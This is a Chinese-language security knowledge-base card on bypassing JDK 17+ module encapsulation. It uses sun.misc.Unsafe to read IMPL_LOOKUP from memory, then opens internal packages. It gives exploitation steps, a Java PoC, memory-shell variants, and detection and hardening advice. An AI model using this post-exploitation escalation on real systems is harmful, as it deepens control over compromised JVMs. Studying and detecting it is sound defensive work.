---
id: web-java-classloader-jdk-module-encapsulation-bypass-unsafe-impl-lookup
title: JDK 17+ 模块强封装绕过：Unsafe 内存直读 IMPL_LOOKUP
type: scenario
domain: web
path: web/java/classloader
technique: unsafe-memory-read-impl-lookup
tags:
- java
- jdk
- unsafe
- methodhandles
- module-system
- reflection
- defineclass
- memory-shell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: JDK 17+（默认强封装；原文测试 OpenJDK 21.0.11-ea）
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:45:00+08:00'
  notes: 已对照原文与 21 张图（含 2 张 SVG）核对：setAccessible 被模块检查拒绝、jdk.unsupported opens sun.misc、Unsafe.staticFieldOffset/getObject 直读 IMPL_LOOKUP、lookupModes 0x7f、implAddOpens false→true、取得 jdk.internal.misc.Unsafe/SharedSecrets、--limit-modules 断链均实测一致；未验证点：卡片防御段称 JDK 21 可直接安装 SecurityManager，实际 JDK 18+ 默认需 -Djava.security.manager=allow，原文该说法存疑；defineClass 仅示例未实测
url: /docs/web/java/classloader/web-java-classloader-jdk-module-encapsulation-bypass-unsafe-impl-lookup/
draft: false
kb_aliases:
- JDK 模块封装绕过
- IMPL_LOOKUP 提权
- Unsafe 绕过 setAccessible
- Module.implAddOpens
- JDK 21 强封装突破
---

## 一句话结论

在 JDK 17+ 已获得 classpath 代码执行的场景下，可先用 `sun.misc.Unsafe` 直接读内存取得 `MethodHandles.Lookup.IMPL_LOOKUP`（TRUSTED 权限），再用它 `implAddOpens` 打开任意模块包或直接 `findStatic` 调用内部 API，从而完全绕过模块系统的强封装。

## 原理

- `Field.setAccessible(true)` 的检查发生在 Java 层 `AccessibleObject.checkCanSetAccessible()`：只有调用者模块与声明模块相同，或目标模块对该包 `opens`，才允许。`java.base` 的 `java.lang.invoke` 只有 `exports` 没有 `opens`，因此直接反射读取 `IMPL_LOOKUP` 会抛 `InaccessibleObjectException`。
- 但 `Class.getDeclaredField()` 只返回字段元数据，不检查模块 `opens`；真正被拦截的是读取字段值的 `Field.get()` 路径。
- `sun.misc.Unsafe` 属于 `jdk.unsupported` 模块，该模块显式 `opens sun.misc`，所以 classpath 代码可以对 `sun.misc` 做 `setAccessible(true)`，取得 `theUnsafe` 单例。
- `Unsafe.staticFieldOffset(Field)` + `Unsafe.getObject(Class, offset)` 直接按内存偏移读取静态字段，走的是 JVM native 层 `HeapAccess::oop_load_at`，不经过任何 Java 反射/模块访问控制。
- `MethodHandles.Lookup.IMPL_LOOKUP` 的构造为 `new Lookup(Object.class, null, Lookup.TRUSTED)`，`allowedModes = TRUSTED = -1`；`Lookup.checkAccess()` 用 `(allowedModes & requestedModes) == 0` 判断，`-1 & x == x` 恒不为 0，所有访问检查短路通过。
- 拿到 `IMPL_LOOKUP` 后，它本身就是以 `java.base` 视角的全权限 Lookup，可 `findStatic/findVirtual/findConstructor` 访问任意内部成员；也可调用非公有 `Module.implAddOpens(String, Module)` 在运行时把任意包对当前模块开放，之后传统反射即可使用。

## 触发条件

- 目标为 JDK 17+（模块系统默认强封装），且 `jdk.unsupported` 模块未被 `--limit-modules` 排除。
- 攻击者已在目标 JVM 内取得代码执行（如反序列化 gadget、表达式注入、Agent 注入、上传 JSP 等），运行在未命名模块/classpath。
- 进程未启用会拦截 `setAccessible` 的自定义 `SecurityManager`（JDK 18+ 默认不允许动态安装；JDK 21 需显式 `-Djava.security.manager=allow`）。

## 利用步骤

1. 通过 `Unsafe.class.getDeclaredField("theUnsafe")` + `setAccessible(true)` 取得 `sun.misc.Unsafe` 实例（`jdk.unsupported opens sun.misc` 使之可行）。
2. `MethodHandles.Lookup.class.getDeclaredField("IMPL_LOOKUP")` 只取 Field 元数据，不触发模块检查。
3. `unsafe.staticFieldOffset(field)` 得到静态字段偏移，`unsafe.getObject(Lookup.class, offset)` 内存直读得到 `IMPL_LOOKUP`。
4. 用 `implLookup.findVirtual(Module.class, "implAddOpens", ...)` 打开 `java.base` 的任意包（如 `jdk.internal.misc`），之后 `setAccessible(true)` 不再抛异常。
5. 或跳过打开模块，直接用 `implLookup.findStatic(...)` 调用 `jdk.internal.misc.Unsafe.getUnsafe()`、`SharedSecrets` 等深层内部 API。
6. 进一步可用可信 Lookup 的 `defineClass(byte[])` 在 `java.base` 包内定义新类，用于内存马/Agent 逻辑植入（需字节码包名与 lookupClass 所在包一致）。

## PoC

```java
import sun.misc.Unsafe;
import java.lang.invoke.*;
import java.lang.reflect.Field;

public class LookupEscalation {
    public static MethodHandles.Lookup getImplLookup() throws Exception {
        // Phase 1: jdk.unsupported opens sun.misc，可直接 setAccessible
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        // Phase 2: 只拿 Field 元数据，不触发 opens 检查
        Field implLookupField = MethodHandles.Lookup.class.getDeclaredField("IMPL_LOOKUP");

        // Phase 3: native 层内存直读静态字段
        long offset = unsafe.staticFieldOffset(implLookupField);
        return (MethodHandles.Lookup) unsafe.getObject(MethodHandles.Lookup.class, offset);
    }

    public static void main(String[] args) throws Throwable {
        MethodHandles.Lookup implLookup = getImplLookup();
        System.out.println("lookupModes=0x" + Integer.toHexString(implLookup.lookupModes())); // 0x7f

        // 动态打开 java.base 的 jdk.internal.misc 包
        Module javaBase = Object.class.getModule();
        Module myModule = LookupEscalation.class.getModule();
        MethodHandle implAddOpens = implLookup.findVirtual(
            Module.class, "implAddOpens",
            MethodType.methodType(void.class, String.class, Module.class));
        implAddOpens.invoke(javaBase, "jdk.internal.misc", myModule);

        // 打开后传统反射可用
        Class<?> internalUnsafe = Class.forName("jdk.internal.misc.Unsafe");
        java.lang.reflect.Method getUnsafe = internalUnsafe.getDeclaredMethod("getUnsafe");
        getUnsafe.setAccessible(true); // 不再抛 InaccessibleObjectException
        System.out.println(getUnsafe.invoke(null));
    }
}
```

预期输出：`lookupModes=0x7f`，`implAddOpens` 前后 `isOpen("jdk.internal.misc", myModule)` 由 `false` 变 `true`，并取得 `jdk.internal.misc.Unsafe` 实例。

## 变体与关联

- 变体（打开模块包）：`Module.implAddOpens` 适合需要对目标包做大量反射操作的场景，效果持续到 JVM 生命周期结束。
- 变体（直接 MethodHandle）：`implLookup.findStatic/findVirtual` 精确调用单个内部方法，无需先 open 模块，最轻量。
- 变体（字节码注入）：用 `implLookup.findConstructor` 构造 `lookupClass=Thread.class` 的可信 Lookup，再 `defineClass(byte[])` 在 `java.lang` 包内植入类；字节码包名必须与 lookupClass 所在包一致，原文未给出完整字节码生成脚本，属未完全验证的延伸用法。
- 关联：该手法常作为反序列化/表达式注入链的“后半段”，把任意 Java 代码执行升级为对 JVM 内部 API 的完全控制；与 `web/java/deserialization`、`web/java/expression` 下的链配合使用。
- 关联：`jdk.internal.misc.Unsafe` 的获取是 `sun.misc.Unsafe` 的更深一层，后续可直接做任意内存读写。

## 检测与防御

- 检测：对 `sun.misc.Unsafe.theUnsafe` 的反射访问；`Unsafe.staticFieldOffset()` 的目标字段属于 `java.lang.invoke` 包。
- 检测：`Module.implAddOpens` / `implAddExports` 的 MethodHandle 调用；运行期 `Module.isOpen` 状态发生非预期变化。
- 检测：`Lookup.defineClass` 在 `java.base` 包内定义类；异常类名/包名与业务不符。
- 检测：RASP 对 `Unsafe.getObject` 插桩，记录对 `MethodHandles.Lookup.class` 的内存读取。
- 修复/加固：`java --limit-modules java.base,...` 排除 `jdk.unsupported`，使 `sun.misc.Unsafe` 无法加载，链路在第一步断裂；用 `VarHandle`/FFM API 替代 Unsafe。
- 加固：JDK 17 仍可用自定义 SecurityManager 拦截 `ReflectPermission("suppressAccessChecks")`；JDK 18+ 默认不再允许动态安装，需显式 `-Djava.security.manager=allow`（已 deprecated，仅作过渡）；关注 JEP 471 移除 Unsafe 的路线。
- 注意：仅靠模块 `exports/opens` 静态声明无法防御此链，必须在运行时监控与最小模块集层面处置。
